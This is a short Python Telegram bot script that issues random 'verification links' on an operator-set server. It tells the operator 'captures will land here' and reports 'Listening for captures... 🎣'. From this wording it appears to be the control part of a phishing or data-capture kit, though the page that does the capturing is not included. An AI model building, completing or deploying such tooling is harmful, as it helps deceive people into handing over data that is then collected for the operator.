import os
import secrets
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
BASE_URL = os.environ.get("BASE_URL", "")  # e.g. https://your-app.onrender.com

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    token = secrets.token_urlsafe(8)
    link = f"{BASE_URL}/v/{token}"
    await update.message.reply_text(
        f"🔗 Your verification link:\n{link}\n\n"
        f"Share it — captures will land here."
    )

async def status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Listening for captures... 🎣")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.run_polling()

if __name__ == "__main__":
    main()
